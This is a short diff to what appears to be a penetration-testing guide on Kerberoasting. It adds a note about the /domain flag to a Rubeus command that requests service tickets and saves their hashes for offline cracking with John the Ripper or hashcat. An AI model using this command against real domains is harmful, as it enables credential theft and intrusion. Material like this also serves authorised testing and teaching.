@@ -49,6 +49,8 @@ This command requests a Service Ticket for user `username`. The `/rc4opsec` flag
 > Rubeus.exe kerberoast /user:<username> /simple /nowrap /rc4opsec /outfile:hashes.txt
 ```
 
+Add `/domain` if user is in a trusted domain.
+
 ## Crack with JtR or hashcat
 
 ```powershell
